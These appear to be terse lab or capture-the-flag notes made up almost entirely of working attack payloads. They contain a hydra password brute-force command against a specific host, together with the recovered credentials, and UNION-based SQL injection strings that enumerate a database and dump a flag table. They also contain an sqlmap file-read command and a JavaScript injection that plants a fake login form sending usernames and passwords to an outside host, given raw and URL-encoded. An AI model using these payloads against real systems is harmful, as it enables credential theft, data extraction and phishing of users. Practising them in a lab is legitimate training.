```bash
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt  154.57.164.77 -s 37614 http-get /
```

username:
satwossh

```bash
password1
```

# Case 2
```sql
UNION * SELECT 1,2,3,4,5,6,7,8,schema_name from INFORMATION_SCHEMA.SCHEMATA-- -
```

```sql
1 UNION select 1,2,3,4,5,6,7,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='testdb'-- --- -
```

```sql
1 UNION select 1,2,3,4,5,6,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='flag2'-- -
```

```sql
1 UNION select 1,2,3,4,5,6,7,8,content from testdb.flag2-- -
```

# Case 3
```sql
UNION ALL SELECT 1,2,3,4,5,6,7,8,schema_name from INFORMATION_SCHEMA.SCHEMATA-- -
```


```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/var/www/html/flag.txt"
```

![](00-Meta/Objects/Pictures/Pasted%20image%2020261022085625.png)


```javascript
javascript:document.write('<h3>Please login to continue</h3><form action=http://10.10.14.72:80><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

```javascript
javascript:document.write('<h3>Please login to continue</h3><form action=http://10.10.14.72:80><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
http://10.129.234.166/phishing/index.php?url=javascript%3Adocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.72%3A80%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B